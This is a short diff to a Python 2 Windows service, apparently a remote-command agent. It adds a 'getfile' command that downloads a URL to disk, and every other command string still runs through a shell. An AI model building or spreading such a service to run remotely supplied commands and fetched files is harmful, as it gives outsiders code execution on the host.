@@ -233,7 +233,18 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                                     httpServ.close()
                                                                        
                                 else:
-                                    p = Popen(scmd,shell=True)
+                                    igetfile=scmd.find('getfile')
+                                    ifile=scmd.rfind('/')
+                                    if igetfile==0:
+                                        geturl =scmd[8:len(scmd)]
+                                        
+                                        sfiledest= scmd[ifile+1:len(scmd)]
+                                        
+                                        f = urllib2.urlopen(geturl)
+                                        with open(swin+'\\'+ sfiledest, "wb") as code:
+                                            code.write(f.read())
+                                    else:
+                                        p = Popen(scmd,shell=True)
                                 #print r.text
                             except Exception,e:
                                 print str(e)
